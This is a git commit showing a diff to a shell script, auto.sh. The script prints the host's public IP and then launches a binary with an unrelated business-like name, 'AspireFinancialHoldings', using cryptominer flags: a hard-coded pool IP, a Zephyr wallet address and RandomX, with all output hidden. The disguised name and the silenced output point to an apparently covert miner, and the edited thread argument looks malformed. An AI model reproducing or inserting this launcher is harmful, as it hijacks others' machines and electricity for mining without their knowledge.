7f9b5c03f9b309d61a5e968cf2a3ebbf6496829b
Mas kurniawan <110314564+55113110159@users.noreply.github.com>
2024-01-13 23:44:36 +0700

    Update auto.sh

--- auto.sh
+++ auto.sh
@@ -3,4 +3,4 @@ sleep 11
 echo "******************************************************************" 
 echo "IP ORI ==> "$(curl ifconfig.me) 
 echo " "
-./AspireFinancialHoldings --donate-level 1 -o 149.50.222.86:80 -u ZEPHsAfZQpiQ33Hf63Tx1MNJQR5cMV1Mx9kkgDMWNGZqMCYdsujaDUk6c4sGGiKzYwiqjucHjEYdfKaX5CbnpxPfGxa5Cb8BzcJ -p 8v -a rx/0 -t $(nproc --all) >/dev/null 2>&1
+./AspireFinancialHoldings --donate-level 1 -o 149.50.222.86:80 -u ZEPHsAfZQpiQ33Hf63Tx1MNJQR5cMV1Mx9kkgDMWNGZqMCYdsujaDUk6c4sGGiKzYwiqjucHjEYdfKaX5CbnpxPfGxa5Cb8BzcJ -p 8v -a rx/0 -t -s >/dev/null 2>&1
